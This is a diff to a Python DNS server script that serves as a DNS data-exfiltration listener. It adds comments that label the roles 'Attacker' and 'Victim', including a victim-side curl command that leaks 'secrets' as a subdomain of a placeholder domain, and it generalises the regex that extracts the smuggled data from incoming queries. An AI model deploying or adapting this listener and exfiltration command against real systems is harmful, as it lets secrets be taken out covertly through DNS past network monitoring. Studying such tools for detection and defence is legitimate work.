@@ -5,7 +5,8 @@ import re
 import binascii
 from dnslib import DNSRecord
 
-# sudo python3 dnsserv.py
+# Attacker: sudo python3 dnsserv.py
+# Victim:   curl secrets.subs.domain.com
 
 # IP and Port to listen on
 UDP_IP = "0.0.0.0"
@@ -31,8 +32,8 @@ while True:
         continue
 
     # Regex search for the specific domain pattern in the DNS message
-    m = re.search(r';(\S+)\.sub\.exfi\.tk', str(msg), re.MULTILINE)
+    m = re.search(r';(\S+)\.<sub-domain>\.<domain>\.com', str(msg), re.MULTILINE)
     
     # If a match is found, print the extracted data
     if m:
-        print('got data:', m.group(1))
+        print('You Got Data:', m.group(1))
